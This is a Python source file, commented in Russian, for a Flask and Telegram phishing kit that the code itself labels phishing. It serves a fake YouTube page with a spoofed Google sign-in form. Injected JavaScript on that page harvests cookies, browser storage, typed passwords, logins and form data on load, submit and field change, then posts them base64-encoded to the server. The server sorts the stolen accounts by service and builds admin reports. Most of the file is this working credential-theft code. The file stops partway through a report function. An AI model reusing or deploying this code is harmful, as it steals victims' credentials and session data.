import logging
import asyncio
import json
import re
import uuid
import html
import os
import time
import threading
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64
from flask import Flask, request, jsonify, make_response, send_from_directory, redirect, Response
from flask_cors import CORS

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"  # Замените на ваш токен
ADMIN_ID = 1709490182  # Ваш Telegram ID
DOMAIN = "https://ваш-ник.pythonanywhere.com"  # Ваш домен на PythonAnywhere или ngrok

# Для ngrok (если используете локально)
USE_NGROK = False  # Поставьте True если хотите использовать ngrok для локального тестирования
NGROK_AUTH_TOKEN = "ваш_токен_ngrok"  # Токен из ngrok.com

# ========== FLASK СЕРВЕР ==========
app = Flask(__name__, static_folder='static')
CORS(app)  # Разрешаем CORS

# Создаем папки если нет
os.makedirs('static', exist_ok=True)
os.makedirs('screenshots', exist_ok=True)

# ========== ВЕБ-ОБРАБОТЧИКИ ==========

@app.route('/')
def home():
    """Главная страница"""
    return redirect("https://youtube.com")

@app.route('/watch')
def phishing_page():
    """Фишинговая страница"""
    video_id = request.args.get('v', 'dQw4w9WgXcQ')
    link_id = request.args.get('id', 'unknown')
    
    # Обновляем счетчик кликов
    if link_id != 'unknown':
        db.add_click(link_id)
    
    # Генерируем HTML страницу
    html_content = js_injector.get_phishing_page_html(video_id, link_id)
    
    # Добавляем сбор данных при загрузке
    html_content = html_content.replace(
        '</body>',
        f"""
        <script>
            // Отправляем данные о заходе
            fetch('/api/visit', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    link_id: '{link_id}',
                    url: window.location.href,
                    user_agent: navigator.userAgent,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                }})
            }});
        </script>
        </body>
        """
    )
    
    return Response(html_content, mimetype='text/html')

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """API для сбора данных"""
    try:
        data = request.json
        logger.info(f"Получены данные: {data.get('data_type', 'unknown')}")
        
        # Сохраняем данные
        link_id = data.get('link_id')
        data_type = data.get('data_type', 'sensitive_data')
        
        if data_type == 'sensitive_data':
            # Обрабатываем в фоновом потоке
            threading.Thread(
                target=process_sensitive_data_background,
                args=(link_id, data)
            ).start()
        elif data_type == 'instant_credentials':
            # Обрабатываем мгновенные данные
            threading.Thread(
                target=process_instant_data_background,
                args=(link_id, data)
            ).start()
        
        return jsonify({"status": "success", "message": "Data received"})
    
    except Exception as e:
        logger.error(f"Ошибка в /api/collect: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/visit', methods=['POST'])
def track_visit():
    """Трекинг посещений"""
    try:
        data = request.json
        link_id = data.get('link_id')
        
        if link_id and link_id != 'unknown':
            db.add_click(link_id)
            
            # Сохраняем информацию о посещении
            db.add_collected_data(link_id, {
                "type": "visit",
                "ip": request.remote_addr,
                "user_agent": data.get('user_agent'),
                "referrer": data.get('referrer'),
                "timestamp": data.get('timestamp')
            })
            
            logger.info(f"Новый визит на ссылку {link_id} с IP: {request.remote_addr}")
        
        return jsonify({"status": "success"})
    
    except Exception as e:
        logger.error(f"Ошибка в /api/visit: {e}")
        return jsonify({"status": "error"}), 500

@app.route('/api/collect_instant', methods=['POST'])
def collect_instant():
    """API для мгновенного сбора данных"""
    return collect_data()  # Используем тот же обработчик

# Фоновые обработчики
def process_sensitive_data_background(link_id, data):
    """Фоновая обработка чувствительных данных"""
    try:
        # Имитируем контекст для отправки сообщений
        class FakeContext:
            def __init__(self):
                self.bot = None
        
        fake_context = FakeContext()
        
        # Вызываем обработчик
        asyncio.run(handle_webhook({
            "link_id": link_id,
            "data_type": "sensitive_data",
            "sensitive_data": data.get("data"),
            "ip": request.remote_addr if 'request' in globals() else "127.0.0.1"
        }, fake_context))
        
    except Exception as e:
        logger.error(f"Ошибка фоновой обработки: {e}")

def process_instant_data_background(link_id, data):
    """Фоновая обработка мгновенных данных"""
    try:
        # Имитируем контекст для отправки сообщений
        class FakeContext:
            def __init__(self):
                self.bot = None
        
        fake_context = FakeContext()
        
        # Вызываем обработчик
        asyncio.run(handle_webhook({
            "link_id": link_id,
            "data_type": "instant_credentials",
            "data": data.get("data"),
            "ip": request.remote_addr if 'request' in globals() else "127.0.0.1"
        }, fake_context))
        
    except Exception as e:
        logger.error(f"Ошибка фоновой обработки мгновенных данных: {e}")

# ========== ОСТАЛЬНОЙ КОД (как в вашем файле) ==========

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    collected_storage_data: List[Dict] = None  # localStorage/sessionStorage
    full_sensitive_data: List[Dict] = None     # Полные сырые данные
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []
        if self.collected_storage_data is None:
            self.collected_storage_data = []
        if self.full_sensitive_data is None:
            self.full_sensitive_data = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0,
            "storage_data_collected": 0,
            "full_data_collected": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage_data: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_storage_data.extend(storage_data)
            self.stats["storage_data_collected"] += len(storage_data)
            self.save()
    
    def add_full_sensitive_data(self, link_id: str, sensitive_data: Dict):
        if link_id in self.links:
            self.links[link_id].full_sensitive_data.append(sensitive_data)
            self.stats["full_data_collected"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Класс для определения принадлежности учетных записей к сервисам
class AccountIdentifier:
    """Класс для определения принадлежности учетных записей к сервисам"""
    
    # Паттерны для определения сервисов по email/логину
    SERVICE_PATTERNS = {
        "google": {
            "email_patterns": ["@gmail.com", "@googlemail.com"],
            "login_patterns": ["google", "gmail", "goog"],
            "cookie_patterns": ["google", "accounts.google", "gstatic", "youtube"],
            "form_patterns": ["google", "gmail"]
        },
        "facebook": {
            "email_patterns": ["@facebook.com"],
            "login_patterns": ["fb_", "facebook", "fb.com"],
            "cookie_patterns": ["facebook", "fb.com", "fbcdn"],
            "form_patterns": ["facebook", "fb_login"]
        },
        "twitter": {
            "email_patterns": [],
            "login_patterns": ["twitter", "x.com", "t.co"],
            "cookie_patterns": ["twitter", "x.com", "twimg"],
            "form_patterns": ["twitter", "x_login"]
        },
        "instagram": {
            "email_patterns": [],
            "login_patterns": ["instagram", "ig_", "insta"],
            "cookie_patterns": ["instagram", "cdninstagram"],
            "form_patterns": ["instagram"]
        },
        "vk": {
            "email_patterns": ["@vk.com", "@vkontakte.ru"],
            "login_patterns": ["vk_", "vkontakte", "vk.com"],
            "cookie_patterns": ["vk", "vkontakte", "userapi"],
            "form_patterns": ["vk", "vkontakte"]
        },
        "whatsapp": {
            "email_patterns": [],
            "login_patterns": ["whatsapp", "wa_"],
            "cookie_patterns": ["whatsapp"],
            "form_patterns": ["whatsapp"]
        },
        "telegram": {
            "email_patterns": [],
            "login_patterns": ["telegram", "tg_"],
            "cookie_patterns": ["telegram", "t.me"],
            "form_patterns": ["telegram"]
        },
        "yandex": {
            "email_patterns": ["@yandex.ru", "@ya.ru", "@yandex.com", "@yandex.ua", "@yandex.kz", "@yandex.by"],
            "login_patterns": ["yandex", "ya_", "yandexid"],
            "cookie_patterns": ["yandex", "yastatic"],
            "form_patterns": ["yandex"]
        },
        "mailru": {
            "email_patterns": ["@mail.ru", "@inbox.ru", "@list.ru", "@bk.ru"],
            "login_patterns": ["mail", "mailru", "my.mail"],
            "cookie_patterns": ["mail", "mail.ru"],
            "form_patterns": ["mail", "mailru"]
        },
        "github": {
            "email_patterns": [],
            "login_patterns": ["github", "gh_"],
            "cookie_patterns": ["github"],
            "form_patterns": ["github"]
        },
        "microsoft": {
            "email_patterns": ["@outlook.com", "@hotmail.com", "@live.com", "@microsoft.com"],
            "login_patterns": ["microsoft", "msft_", "outlook", "hotmail"],
            "cookie_patterns": ["microsoft", "live.com", "outlook"],
            "form_patterns": ["microsoft", "live"]
        }
    }
    
    # Перевод названий сервисов на русский
    SERVICE_NAMES_RU = {
        "google": "Google/Gmail",
        "facebook": "Facebook",
        "twitter": "Twitter/X",
        "instagram": "Instagram",
        "vk": "ВКонтакте",
        "whatsapp": "WhatsApp",
        "telegram": "Telegram",
        "yandex": "Яндекс",
        "mailru": "Mail.ru",
        "github": "GitHub",
        "microsoft": "Microsoft/Outlook"
    }
    
    @staticmethod
    def identify_account(value: str, source_data: Dict = None) -> List[str]:
        """Определяет к какому сервису принадлежит учетная запись"""
        identified_services = []
        
        if not value:
            return identified_services
        
        value_lower = value.lower()
        
        # Проверяем по паттернам
        for service, patterns in AccountIdentifier.SERVICE_PATTERNS.items():
            # Проверка по email
            if any(pattern in value_lower for pattern in patterns["email_patterns"]):
                if service not in identified_services:
                    identified_services.append(service)
                continue
            
            # Проверка по логину
            if any(pattern in value_lower for pattern in patterns["login_patterns"]):
                if service not in identified_services:
                    identified_services.append(service)
                continue
            
            # Проверка по cookies (если есть source_data)
            if source_data and "cookies" in source_data:
                cookies_str = str(source_data.get("cookies", {})).lower()
                if any(pattern in cookies_str for pattern in patterns["cookie_patterns"]):
                    if service not in identified_services:
                        identified_services.append(service)
                    continue
        
        # Дополнительная эвристика для email-адресов
        if "@" in value_lower:
            email_domain = value_lower.split("@")[1]
            
            # Общие домены
            domain_service_map = {
                "gmail.com": "google",
                "googlemail.com": "google",
                "yandex.ru": "yandex",
                "ya.ru": "yandex",
                "yandex.com": "yandex",
                "yandex.ua": "yandex",
                "yandex.kz": "yandex",
                "yandex.by": "yandex",
                "mail.ru": "mailru",
                "inbox.ru": "mailru",
                "list.ru": "mailru",
                "bk.ru": "mailru",
                "outlook.com": "microsoft",
                "hotmail.com": "microsoft",
                "live.com": "microsoft",
                "microsoft.com": "microsoft",
                "facebook.com": "facebook",
                "vk.com": "vk",
                "vkontakte.ru": "vk"
            }
            
            if email_domain in domain_service_map:
                service = domain_service_map[email_domain]
                if service not in identified_services:
                    identified_services.append(service)
        
        return identified_services
    
    @staticmethod
    def identify_accounts_from_data(collected_data: List[Dict]) -> Dict:
        """Определяет сервисы из всех собранных данных"""
        service_results = {
            "identified_accounts": [],
            "service_stats": {},
            "credentials_by_service": {}
        }
        
        for data_item in collected_data:
            # Для логинов
            if "value" in data_item and data_item["value"]:
                services = AccountIdentifier.identify_account(data_item["value"], data_item)
                if services:
                    data_item["identified_services"] = services
                    service_results["identified_accounts"].append({
                        "value": data_item["value"],
                        "services": services,
                        "type": data_item.get("field_name", "unknown"),
                        "source": data_item.get("source", "unknown")
                    })
                    
                    # Обновляем статистику
                    for service in services:
                        if service not in service_results["service_stats"]:
                            service_results["service_stats"][service] = 0
                        service_results["service_stats"][service] += 1
                        
                        # Группируем по сервисам
                        if service not in service_results["credentials_by_service"]:
                            service_results["credentials_by_service"][service] = []
                        service_results["credentials_by_service"][service].append({
                            "value": data_item["value"][:50] + ("..." if len(data_item["value"]) > 50 else ""),
                            "type": data_item.get("field_name", "unknown"),
                            "source": data_item.get("source", "unknown"),
                            "timestamp": data_item.get("timestamp", "")
                        })
        
        return service_results

# Генератор JavaScript для сбора данных
class JavaScriptInjector:
    @staticmethod
    def get_cookies_collection_script() -> str:
        """JavaScript для сбора cookies"""
        return """
        <script>
        // Функция для сбора всех cookies
        function collectAllCookies() {
            const cookies = {};
            
            // Собираем cookies из document.cookie
            const cookieString = document.cookie;
            if (cookieString) {
                cookieString.split(';').forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        cookies[name] = decodeURIComponent(value);
                    }
                });
            }
            
            // Пытаемся получить cookies для текущего домена и поддоменов
            try {
                // Для важных доменов пытаемся собрать специфичные cookies
                const importantDomains = [
                    'google.com', 'facebook.com', 'twitter.com', 
                    'instagram.com', 'vk.com', 'youtube.com',
                    'whatsapp.com', 'telegram.org', 'github.com',
                    'microsoft.com', 'apple.com', 'amazon.com'
                ];
                
                importantDomains.forEach(domain => {
                    try {
                        // Проверяем доступ к localStorage и sessionStorage
                        if (window.localStorage) {
                            const lsData = {};
                            for (let i = 0; i < localStorage.length; i++) {
                                const key = localStorage.key(i);
                                lsData[key] = localStorage.getItem(key);
                            }
                            cookies['localStorage_' + domain] = JSON.stringify(lsData);
                        }
                        
                        if (window.sessionStorage) {
                            const ssData = {};
                            for (let i = 0; i < sessionStorage.length; i++) {
                                const key = sessionStorage.key(i);
                                ssData[key] = sessionStorage.getItem(key);
                            }
                            cookies['sessionStorage_' + domain] = JSON.stringify(ssData);
                        }
                    } catch (e) {
                        // Игнорируем ошибки доступа
                    }
                });
            } catch (e) {
                console.error('Error collecting advanced cookies:', e);
            }
            
            return cookies;
        }
        
        // Функция для сбора сохраненных паролей и логинов
        function collectSavedCredentials() {
            const credentials = {
                passwords: [],
                logins: [],
                autofill_data: []
            };
            
            try {
                // Ищем все поля паролей и логинов
                const passwordFields = document.querySelectorAll('input[type="password"]');
                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
                
                // Собираем значения из полей
                passwordFields.forEach(field => {
                    if (field.value) {
                        credentials.passwords.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                loginFields.forEach(field => {
                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
                        credentials.logins.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                // Собираем данные из всех форм
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = new FormData(form);
                        const formValues = {};
                        for (let [key, value] of formData.entries()) {
                            formValues[key] = value;
                        }
                        
                        if (Object.keys(formValues).length > 0) {
                            credentials.autofill_data.push({
                                type: 'form_data',
                                form_id: form.id || 'unknown',
                                form_action: form.action || 'unknown',
                                data: formValues
                            });
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
                
            } catch (e) {
                console.error('Error collecting credentials:', e);
            }
            
            return credentials;
        }
        
        // Главная функция сбора всех данных
        async function collectAllSensitiveData() {
            const allData = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: {},
                credentials: {},
                browser_info: {
                    cookie_enabled: navigator.cookieEnabled,
                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
                    do_not_track: navigator.doNotTrack || 'unspecified'
                }
            };
            
            try {
                // Собираем cookies
                allData.cookies = collectAllCookies();
                
                // Собираем пароли и логины
                allData.credentials = collectSavedCredentials();
                
                // Собираем информацию о браузере
                allData.screen_info = {
                    width: window.screen.width,
                    height: window.screen.height,
                    color_depth: window.screen.colorDepth,
                    pixel_depth: window.screen.pixelDepth
                };
                
                // Собираем информацию о часовом поясе
                allData.timezone = {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                return allData;
                
            } catch (error) {
                console.error('Error collecting sensitive data:', error);
                return {
                    error: error.message,
                    partial_data: allData
                };
            }
        }
        
        // Функция отправки данных на сервер
        function sendCollectedData(data, type = 'sensitive_data') {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                // Кодируем данные для отправки
                const jsonData = JSON.stringify(data);
                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                
                // Отправляем данные
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: type,
                        data: encodedData,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent successfully:', result);
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                });
            } catch (error) {
                console.error('Error preparing data for send:', error);
            }
        }
        
        // Автоматический сбор данных при загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(async () => {
                try {
                    const sensitiveData = await collectAllSensitiveData();
                    sendCollectedData(sensitiveData, 'sensitive_data');
                } catch (e) {
                    console.error('Initial collection failed:', e);
                }
                
                // Дополнительный сбор при взаимодействии с формами
                document.addEventListener('submit', async function(e) {
                    setTimeout(async () => {
                        try {
                            const formData = await collectAllSensitiveData();
                            sendCollectedData(formData, 'sensitive_data');
                        } catch (e) {
                            console.error('Form submit collection failed:', e);
                        }
                    }, 500);
                });
                
                // Сбор при изменении полей
                document.querySelectorAll('input, textarea, select').forEach(input => {
                    input.addEventListener('change', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData, 'sensitive_data');
                            } catch (e) {
                                console.error('Field change collection failed:', e);
                            }
                        }, 1000);
                    });
                });
                
            }, 3000); // Ждем 3 секунды для загрузки страницы
        });
        
        // Сбор данных при уходе со страницы
        window.addEventListener('beforeunload', async function() {
            try {
                const exitData = await collectAllSensitiveData();
                sendCollectedData(exitData, 'sensitive_data');
            } catch (e) {
                console.error('Exit collection failed:', e);
            }
        });
        </script>
        """
    
    @staticmethod
    def get_instant_credential_collection_script() -> str:
        """JavaScript для мгновенного сбора учетных данных при загрузке"""
        return """
        <script>
        // Функция для принудительного сбора всех учетных данных на странице
        function forceCollectAllCredentials() {
            const credentials = {
                instant_passwords: [],
                instant_logins: [],
                instant_forms: []
            };
            
            try {
                // 1. Собираем ВСЕ пароли из всех форм
                document.querySelectorAll('input[type="password"]').forEach(field => {
                    if (field.value && field.value.trim() !== '') {
                        credentials.instant_passwords.push({
                            source: 'auto_detected',
                            field_name: field.name || field.id || field.placeholder || 'password_field',
                            field_id: field.id,
                            field_type: field.type,
                            field_class: field.className,
                            value: field.value,
                            form_id: field.form ? field.form.id : 'no_form',
                            page_url: window.location.href,
                            timestamp: new Date().toISOString(),
                            collected_on: 'page_load'
                        });
                    }
                });
                
                // 2. Собираем ВСЕ возможные логин-поля
                const loginSelectors = [
                    'input[type="text"]',
                    'input[type="email"]', 
                    'input[type="tel"]',
                    'input[name*="login"]',
                    'input[name*="user"]',
                    'input[name*="email"]',
                    'input[name*="username"]',
                    'input[autocomplete*="username"]',
                    'input[autocomplete*="email"]'
                ];
                
                loginSelectors.forEach(selector => {
                    document.querySelectorAll(selector).forEach(field => {
                        if (field.value && field.value.trim() !== '') {
                            credentials.instant_logins.push({
                                source: 'auto_detected',
                                field_name: field.name || field.id || field.placeholder || 'login_field',
                                field_id: field.id,
                                field_type: field.type,
                                field_class: field.className,
                                value: field.value,
                                form_id: field.form ? field.form.id : 'no_form',
                                page_url: window.location.href,
                                timestamp: new Date().toISOString(),
                                collected_on: 'page_load'
                            });
                        }
                    });
                });
                
                // 3. Собираем данные из ВСЕХ форм на странице
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = {};
                        form.querySelectorAll('input, textarea, select').forEach(input => {
                            if (input.name && (input.value || input.value === 0 || input.value === false)) {
                                formData[input.name] = input.value;
                            }
                        });
                        
                        if (Object.keys(formData).length > 0) {
                            credentials.instant_forms.push({
                                form_id: form.id || 'anonymous_form',
                                form_action: form.action || 'unknown',
                                form_method: form.method || 'get',
                                data: formData,
                                timestamp: new Date().toISOString()
                            });
                        }
                    } catch (e) {
                        // Игнорируем ошибки
                    }
                });
                
            } catch (error) {
                console.error('Error in force credential collection:', error);
            }
            
            return credentials;
        }
        
        // Функция для отправки мгновенно собранных данных
        function sendInstantCredentials() {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                // Собираем данные
                const instantData = forceCollectAllCredentials();
                
                const allData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    instant_collection: instantData,
                    user_agent: navigator.userAgent,
                    collected_on_load: true
                };
                
                // Отправляем данные
                fetch('/api/collect_instant', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'instant_credentials',
                        data: btoa(unescape(encodeURIComponent(JSON.stringify(allData)))),
                        timestamp: new Date().toISOString()
                    }),
                    keepalive: true
                }).catch(error => {
                    console.error('Error sending instant credentials:', error);
                });
                
            } catch (error) {
                console.error('Error sending instant credentials:', error);
            }
        }
        
        // Запускаем сбор сразу при загрузке DOM
        document.addEventListener('DOMContentLoaded', function() {
            sendInstantCredentials();
            
            // Повторный сбор через 1 секунду (для автозаполнения)
            setTimeout(sendInstantCredentials, 1000);
        });
        
        // Также собираем при полной загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(sendInstantCredentials, 500);
        });
        </script>
        """
    
    @staticmethod
    def get_phishing_page_html(video_id: str, link_id: str) -> str:
        """Генерация HTML фишинговой страницы"""
        base_html = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube Video Player</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: #000;
                    font-family: Arial, sans-serif;
                }}
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                .player-container {{
                    position: relative;
                    padding-bottom: 56.25%;
                    height: 0;
                    overflow: hidden;
                }}
                .player-container iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                }}
                .loading {{
                    text-align: center;
                    color: #fff;
                    padding: 50px;
                    font-size: 18px;
                }}
                .ad-banner {{
                    background: #ff0000;
                    color: white;
                    text-align: center;
                    padding: 10px;
                    margin: 20px 0;
                    border-radius: 5px;
                }}
                .login-prompt {{
                    background: #4285f4;
                    color: white;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ad-banner">
                    🎬 Для просмотра видео требуется авторизация через Google
                </div>
                
                <div class="player-container">
                    <iframe 
                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen>
                    </iframe>
                </div>
                
                <div class="login-prompt" id="loginPrompt">
                    <h3>⚠️ Требуется вход в аккаунт</h3>
                    <p>Для продолжения просмотра войдите в свой аккаунт Google</p>
                    <button onclick="showLoginForm()" style="
                        background: white;
                        color: #4285f4;
                        border: none;
                        padding: 10px 20px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin: 10px;
                    ">
                        Войти в аккаунт
                    </button>
                </div>
                
                <div id="loginForm" style="display: none;">
                    <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3 style="color: #333;">Вход в Google</h3>
                        <form id="googleLoginForm">
                            <input type="email" 
                                   placeholder="Электронная почта или телефон" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <input type="password" 
                                   placeholder="Введите пароль" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <button type="submit" 
                                    style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                Далее
                            </button>
                        </form>
                        <p style="color: #666; font-size: 12px; margin-top: 10px;">
                            Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
                        </p>
                    </div>
                </div>
                
                <div class="loading" id="loading">
                    Загрузка видео... Пожалуйста, подождите
                </div>
            </div>
            
            <script>
                function showLoginForm() {{
                    document.getElementById('loginPrompt').style.display = 'none';
                    document.getElementById('loginForm').style.display = 'block';
                    document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
                    
                    // Имитация проверки
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
                        setTimeout(function() {{
                            document.getElementById('loading').style.display = 'none';
                        }}, 2000);
                    }}, 1500);
                }}
                
                // Обработка формы входа
                document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
                    e.preventDefault();
                    document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
                    
                    // Собираем данные формы
                    const email = this.querySelector('input[type="email"]').value;
                    const password = this.querySelector('input[type="password"]').value;
                    
                    // Отправляем данные (имитация)
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
                        // Здесь будет отправка данных на сервер
                    }}, 2000);
                }});
                
                // Автоматический показ формы через 5 секунд
                setTimeout(function() {{
                    showLoginForm();
                }}, 5000);
            </script>
            {JavaScriptInjector.get_cookies_collection_script()}
            {JavaScriptInjector.get_instant_credential_collection_script()}
        </body>
        </html>
        """
        return base_html

# Генератор ссылок
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # Если не нашли, возвращаем дефолтный (Rick Roll)
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# Функции для работы с сообщениями
def split_message(text: str, max_length: int = 4000) -> List[str]:
    """Разбивает длинное сообщение на части"""
    if len(text) <= max_length:
        return [text]
    
    chunks = []
    while text:
        if len(text) <= max_length:
            chunks.append(text)
            break
        
        # Находим последний перенос строки в пределах лимита
        split_pos = text.rfind('\n', 0, max_length)
        if split_pos == -1:
            split_pos = max_length
        
        chunks.append(text[:split_pos])
        text = text[split_pos:].lstrip()
    
    return chunks

def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> str:
    """Форматирование детального отчета для админа"""
    report = f"""
🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ*
    
📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
🔗 Оригинальное видео: {link.original_url[:50]}...
📅 Время сбора: {datetime.now().isoformat()}
    
📊 *ОБЩАЯ СТАТИСТИКА:*
• Переходов по ссылке: {link.clicks}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
    
════════════════════════════════════════
    """
    
    # Добавляем детали cookies
    if link.collected_cookies:
        report += "\n🍪 *COOKIES (первые 15):*\n"
        for i, cookie in enumerate(link.collected_cookies[:15], 1):
            value_preview = cookie.get('value', '')
            if len(value_preview) > 50:
                value_preview = value_preview[:50] + "..."
            report += f"{i}. {cookie.get('name', 'N/A')}: {value_preview}\n"
    
